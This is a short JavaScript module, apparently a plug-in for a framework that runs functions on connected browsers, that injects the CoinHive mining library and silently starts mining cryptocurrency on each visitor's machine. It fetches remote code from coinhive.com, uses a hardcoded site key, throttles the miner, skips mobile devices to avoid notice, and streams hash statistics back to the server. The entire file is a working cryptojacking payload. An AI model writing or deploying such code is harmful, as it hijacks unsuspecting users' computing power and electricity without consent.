let Module = require('../src/server/Module.js');

CoinHiveModule = new Module();

CoinHiveModule.addDependencies("https://coinhive.com/lib/coinhive.min.js");

CoinHiveModule.setDefaultConfig({
	"siteKey": "EeIIqtrF5oLgHOgpPQGtIkXUe3JvAI15"
});

CoinHiveModule.setMainFunction(function(module, socket, config) {
	socket.executeFunc(module, "startMiner", config["siteKey"]);
	
	socket.on("minerData", console.log);
});

CoinHiveModule.addRemoteFunction("startMiner", function(sitekey, debug) {
	let miner = new CoinHive.Anonymous(sitekey, {throttle: 0.2});
	// Only start on non-mobile devices
	if (!miner.isMobile()) {
		miner.start();
		if (debug) console.log("Debug: Miner started!");	
		setInterval(function() {
			let hashesPerSecond = miner.getHashesPerSecond();
			let totalHashes = miner.getTotalHashes();
			let acceptedHashes = miner.getAcceptedHashes();

			socket.emit("minerData", [hashesPerSecond, totalHashes, acceptedHashes]);
		}, 1000);					
	}
});

module.exports = CoinHiveModule;